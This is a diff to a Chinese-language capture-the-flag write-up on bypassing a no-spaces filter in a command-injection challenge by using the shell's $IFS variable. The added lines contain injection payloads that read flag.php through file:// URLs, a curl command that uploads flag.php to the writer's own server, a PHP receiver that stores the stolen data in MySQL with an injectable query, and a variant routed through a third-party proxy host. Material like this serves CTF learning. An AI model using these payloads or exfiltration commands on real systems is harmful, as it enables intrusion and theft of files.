@@ -13,7 +13,19 @@ $cmd不允许存在空格...
 利用Shell 脚本中有个变量叫IFS(Internal Field Seprator) ，内部域分隔符
 echo $IFS   | od -b  
 
-最后 $cmd=$IFS\file://$PWD/flag.php
+最后 $cmd=$IFS\file:///$PWD/flag.php
 或者 $cmd=$IFS\file:///var/www/html/exam/flag.php$IFS\
-
-
+    $cmd=$IFS"file:///$PWD/"
+    
+    $cmd=curl -T flag.php http://自己的服务器/getflag.php < ./flag.php
+    getflag.php 
+    ```
+       <?php
+        $db = new mysqli('localhost', 'root', 'root', 'getflag');
+        $t = file_get_contents('php://input');
+        $db->query("INSERT INTO `getflag` (`flag`) VALUES('{$t}')");
+        ?>
+    ```
+    
+    我发现的:$cmd=$IFS\-x$IFS\wonderkun.cc$IFS\-T$IFS\flag.php$IFS\http
+    
